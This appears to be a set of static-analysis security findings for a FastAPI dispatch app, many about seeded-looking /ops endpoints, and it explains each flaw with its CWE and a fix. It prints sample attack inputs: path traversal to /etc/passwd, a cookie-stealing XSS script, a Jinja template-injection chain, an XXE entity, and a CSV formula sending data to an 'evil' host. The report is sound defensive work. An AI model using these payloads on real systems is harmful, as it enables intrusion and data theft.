extra.message: The _wrk_gate dependency compares the attacker-supplied x-internal-token header to the INTERNAL_OPS_TOKEN secret with Python's non-constant-time '!=' operator. String comparison short-circuits at the first differing byte, creating an observable timing discrepancy that can leak the shared token byte-by-byte and unlock every /ops endpoint (including the path-traversal, SSRF, and RCE routes below). Use hmac.compare_digest / secrets.compare_digest instead.

cwe: CWE-208: Observable Timing Discrepancy

extra.message: GET /ops/parcel/dispatch-cargo-slot-050 joins the user-controlled packet_ref query parameter onto BASE_EXPORT_DIR with no containment check and returns the file contents via Path.read_text() as PlainTextResponse. A request such as ?packet_ref=../../etc/passwd escapes private_exports and reads arbitrary files on the server.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: GET /ops/relay/dispatch-carrier-echo-051 passes the user-controlled url query parameter directly to urllib.request.urlopen() with no scheme/host allowlist or private-IP blocking. An attacker can make the server fetch internal-only resources (cloud metadata at 169.254.169.254, localhost services, RFC-1918 hosts) and read up to 2048 bytes of the response body, which is echoed back in the JSON response.

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: POST /ops/delta/dispatch-nudge-131 performs no validation on the JSON body: amount is cast to int and subtracted from the ledger balance with no range check (the ledger's own limit of 900 is never enforced, and negative amounts inflate the balance), and state is taken verbatim from the payload so any approval state can be set. This allows unrestricted manipulation of a financial ledger record's balance and state.

cwe: CWE-840: Business Logic Errors
CWE-20: Improper Input Validation

extra.message: GET /ops/after/dispatch-lane-156 passes the user-controlled lane query parameter directly to RedirectResponse() without validating that it is a safe relative path. A request like ?lane=https://evil.example/phish makes the server issue a redirect to an attacker-controlled site, usable for phishing and token theft via crafted links.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: POST /ops/wire/dispatch-tally-218 logs the raw request body together with the complete Authorization header (Bearer session token) at WARNING level via logger.warning. Session credentials written to application logs in plaintext can be read by anyone with access to log files or log aggregation, enabling session hijacking.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: GET /ops/formula/dispatch-cast-259 passes the user-controlled expr query parameter to eval(). Restricting __builtins__ does not prevent escape: attribute-chain payloads (e.g. traversing __class__.__bases__[0].__subclasses__() to reach the os module) or lambda/function tricks allow arbitrary code execution, giving remote code execution on the server.

cwe: CWE-94: Improper Control of Generation of Code ('Code Injection')
CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

extra.message: GET /ops/spool/dispatch-fan-308 materializes a list of count dicts where the count query parameter has no upper bound (only a default of 500). A request with ?count=999999999 causes massive CPU and memory allocation in a single request, exhausting server resources and causing denial of service.

cwe: CWE-400: Uncontrolled Resource Consumption

extra.message: GET /ops/blurb/dispatch-tile-323 renders the user-controlled card parameter through Jinja2 using the |safe filter, which disables HTML autoescaping, and returns the result as HTMLResponse. A payload like ?card=<script>alert(document.cookie)</script> executes attacker-supplied JavaScript in the victim's browser (reflected cross-site scripting).

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: GET /ops/identity/dispatch-hint-462 returns HTTP 404 when handle is unknown but HTTP 403 when the handle exists with a wrong verifier, letting attackers enumerate valid handles from the observable response discrepancy. Additionally, the verifier secrets are weak 4-digit values hardcoded in source ('4812', '5930'), trivially brute-forceable once a handle is known.

cwe: CWE-204: Observable Response Discrepancy
CWE-798: Use of Hard-coded Credentials

extra.message: GET /ops/origin/dispatch-mirror-472 reflects the attacker-controlled Origin header verbatim into the Access-Control-Allow-Origin response header and sets Access-Control-Allow-Credentials: true. Any website can therefore make credentialed cross-origin requests to the application (the app accepts session cookies for authentication in current_user), enabling full CSRF-style data theft from authenticated victims.

cwe: CWE-346: Origin Validation Error
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: GET /ops/frame/dispatch-slip-482 explicitly sets X-XSS-Protection to '0' (disabling the browser's XSS auditor) and sets Content-Security-Policy to an empty string (defeating CSP entirely). This strips defense-in-depth protections for the entire origin, leaving users unprotected from XSS delivered from any endpoint on the same origin.

cwe: CWE-693: Protection Mechanism Failure
CWE-16: Configuration

extra.message: GET /ops/jinja/dispatch-cast-487 concatenates the user-controlled fragment parameter into the Jinja2 template string itself (Template("Result: " + fragment)) instead of passing it as a render variable, so the fragment is evaluated as template code. Payloads like ?fragment={{ ''.__class__.__mro__[1].__subclasses__() }} execute arbitrary Jinja expressions, and object-chain traversal can reach file and OS operations — server-side template injection leading to RCE.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
CWE-94: Improper Control of Generation of Code ('Code Injection')

extra.message: POST /ops/dock/dispatch-shelf-498 joins the user-controlled name parameter onto BASE_EXPORT_DIR with no sanitization, creates arbitrary parent directories with mkdir(parents=True), and writes the raw request body to the resolved path via write_bytes(). A request with name=../../backend/app/main.py (or any traversal target such as ~/.ssh/authorized_keys) overwrites arbitrary files outside the intended directory with attacker-controlled content.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: GET /ops/nonce/dispatch-roll-512 generates a token/code using random.choice() from the random module, which is a Mersenne Twister PRNG that is not cryptographically secure and is predictable from observed outputs. The application correctly uses secrets.token_urlsafe elsewhere (backend/app/core/security.py); any security-sensitive token must use the secrets module.

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)

extra.message: POST /ops/xml/dispatch-fold-518 parses the raw request body with lxml using XMLParser(load_dtd=True, resolve_entities=True, no_network=False). External entities are loaded and resolved, so a payload containing <!ENTITY xxe SYSTEM "file:///etc/passwd"> reads local files, and http://-based entities perform SSRF from the server — classic XML External Entity injection.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: GET /ops/trace/dispatch-panel-532 returns internal deployment details in the response body: the value of the APP_ENV environment variable and the absolute BASE_EXPORT_DIR filesystem path. Disclosing environment configuration and server paths aids further attacks such as the path traversal on /ops/parcel/dispatch-cargo-slot-050.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: POST /ops/mongo/dispatch-lane-542 passes the parsed JSON request body (or its 'filter' field) directly as a MongoDB query filter to find_one() with no sanitization or operator restriction. Attackers can inject MongoDB operators ($ne, $gt, $regex, $where) to bypass intended query constraints, enumerate all documents in the ops.records collection, and extract data via blind injection.

cwe: CWE-943: Improper Neutralization of Special Elements in Data Used in an Application Logic (NoSQL Injection)

extra.message: GET /ops/trust/dispatch-drift-552 creates an SSL context with ssl._create_unverified_context() and uses it for the outbound HTTPS request to the partner endpoint, disabling all certificate verification (chain, hostname, revocation). A man-in-the-middle presenting any self-signed or malicious certificate can intercept and tamper with the partner communication.

cwe: CWE-295: Improper Certificate Validation

extra.message: The JWT signing secret falls back to the hardcoded, well-known default 'local-dev-change-me' whenever the SECRET_KEY environment variable is unset. create_access_token/decode_access_token in backend/app/core/security.py sign and verify HS256 tokens with this value, so anyone who knows the default can forge a valid JWT for any user id and role (e.g. ops_admin) — complete authentication bypass. There is no startup check that a non-default secret is configured.

cwe: CWE-798: Use of Hard-coded Credentials

extra.message: The dispatch_session cookie containing the JWT access token is set with secure=False, so the session credential is transmitted over unencrypted HTTP and can be captured by a network attacker (sniffing/MITM) and replayed for up to 12 hours. The cookie should always be marked Secure outside strictly local development.

cwe: CWE-614: Sensitive Cookie in Session With Incorrect 'Secure' Attribute

extra.message: POST /api/auth/register only checks that the supplied customer_id exists in the database — it performs no ownership or invitation check. Any unauthenticated attacker can self-register a customer-role account under any valid (sequential) customer_id and immediately gain that customer's read access to jobs, service addresses, customer-visible proof documents, and messages via job_query_for_user (which scopes Role.customer users solely by user.customer_id). This breaks tenant isolation for every customer organization.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key
CWE-862: Missing Authorization

extra.message: csv_response() writes exported rows via csv.DictWriter without neutralizing leading '=', '+', '-', or '@' characters. User-controlled fields flow into exports — e.g. incident customer_summary and internal_notes set through POST /api/incidents or values loaded via POST /api/import/{kind} — so a cell like =WEBSERVICE("http://evil/"&A1) or =cmd|'/c calc'!A0 executes when an admin/dispatcher opens the /api/export CSV in Excel or LibreOffice (CSV formula injection).

cwe: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

extra.message: The /api/export/routes handler loads every route in the database and only skips routes outside the dispatcher's region; there is no scope filter for field_worker users. By contrast, GET /api/routes correctly restricts field workers to Route.worker_id == user.id. A field worker can therefore export the complete company-wide route schedule, including other workers' jobs, references, and statuses — broken role-based access control on a sensitive report.

cwe: CWE-862: Missing Authorization
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
